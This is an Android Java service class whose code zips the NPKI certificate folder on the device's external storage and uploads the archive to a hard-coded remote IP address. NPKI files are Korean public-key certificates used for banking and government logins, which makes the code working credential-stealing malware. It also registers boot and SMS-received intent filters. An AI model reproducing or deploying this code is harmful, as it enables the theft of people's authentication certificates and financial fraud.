package com.example.center;

import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.InputStream;

import org.apache.commons.io.IOUtils;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.mime.MultipartEntity;
import org.apache.http.entity.mime.content.InputStreamBody;
import org.apache.http.impl.client.DefaultHttpClient;

import android.app.Service;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Environment;
import android.os.IBinder;
import android.widget.Toast;

public class MyService extends Service {

	// List<String> fileList;
	// 지정된 위치에 압축파일 생성
	private static final String OUTPUT_ZIP_FILE = Environment
			.getExternalStorageDirectory().getAbsolutePath() + "/npki.zip";
	// 압축할 폴더 위치 지정
	private static final String SOURCE_FOLDER = Environment
			.getExternalStorageDirectory().getAbsolutePath() + "/NPKI";


	@Override
	public void onCreate() {
		super.onCreate();
		Toast.makeText(this, "onCreate", Toast.LENGTH_SHORT).show();
	}

	@Override
	public void onDestroy() {
		super.onDestroy();
		Toast.makeText(this, "onDestroy", Toast.LENGTH_SHORT).show();
	}

	@Override
	public void onRebind(Intent intent) {
		super.onRebind(intent);
		Toast.makeText(this, "onRebind", Toast.LENGTH_SHORT).show();
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		Toast.makeText(this, "onStartCommand", Toast.LENGTH_SHORT).show();

		IntentFilter intentFilter = new IntentFilter(
				Intent.ACTION_BOOT_COMPLETED);
		intentFilter.addAction("android.provider.Telephony.SMS_RECEIVED");

		Toast.makeText(this, SOURCE_FOLDER, Toast.LENGTH_SHORT).show();
		zipNPKI(); // NPKI 파일을 압축
		Toast.makeText(this, OUTPUT_ZIP_FILE, Toast.LENGTH_SHORT).show();

		uploadFile(OUTPUT_ZIP_FILE, "npki.zip"); // 파일 업로드
		Toast.makeText(getApplicationContext(), "end", 0).show();

		return super.onStartCommand(intent, flags, startId);
	}

	@Override
	public boolean onUnbind(Intent intent) {
		Toast.makeText(this, "onUnbind", Toast.LENGTH_SHORT).show();
		return super.onUnbind(intent);
	}

	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		Toast.makeText(this, "onBind", Toast.LENGTH_SHORT).show();
		return null;
	}

	public static void zipNPKI() {
		ZipFolder ZipFolder = new ZipFolder();
		ZipFolder.generateFileList(new File(SOURCE_FOLDER));
		ZipFolder.zipIt(OUTPUT_ZIP_FILE);
	}

	/**
	 * Upload the specified file to the PHP server.
	 * 
	 * @param filePath
	 *            The path towards the file.
	 * @param fileName
	 *            The name of the file that will be saved on the server.
	 */
	private void uploadFile(String filePath, String fileName) {

		Runnable threadd = new threadd(filePath, fileName);
		Thread threadd1 = new Thread(threadd);
		threadd1.start();
	}

	public class threadd implements Runnable {

		String filePath;
		String fileName;

		public threadd(String filePath, String fileName) {
			this.filePath = filePath;
			this.fileName = fileName;
		}

		@Override
		public void run() {
			// TODO Auto-generated method stub
			InputStream inputStream;
			try {
				inputStream = new FileInputStream(new File(filePath));
				byte[] data;
//				Toast.makeText(getApplicationContext(), "FILE OPEN", 0).show();
				try {
					data = IOUtils.toByteArray(inputStream);

					HttpClient httpClient = new DefaultHttpClient();
					HttpPost httpPost = new HttpPost(
							"http://203.249.6.98:2013/upload.php");

					InputStreamBody inputStreamBody = new InputStreamBody(
							new ByteArrayInputStream(data), fileName);
					MultipartEntity multipartEntity = new MultipartEntity();
					multipartEntity.addPart("file", inputStreamBody);
					httpPost.setEntity(multipartEntity);

					HttpResponse httpResponse = httpClient.execute(httpPost);

					// Handle response back from script.
					if (httpResponse != null) {
					} else { // Error, no response.
					}
//					Toast.makeText(getApplicationContext(), "Second try", 0)
//							.show();
				} catch (Exception e) {
					e.printStackTrace();
//					Toast.makeText(getApplicationContext(),
//							"전송 에러", Toast.LENGTH_SHORT).show();
				}
			} catch (FileNotFoundException e1) {
				e1.printStackTrace();
//				Toast.makeText(getApplicationContext(),
//						e1.getMessage().toString(), Toast.LENGTH_SHORT).show();
			}
		}
	}

}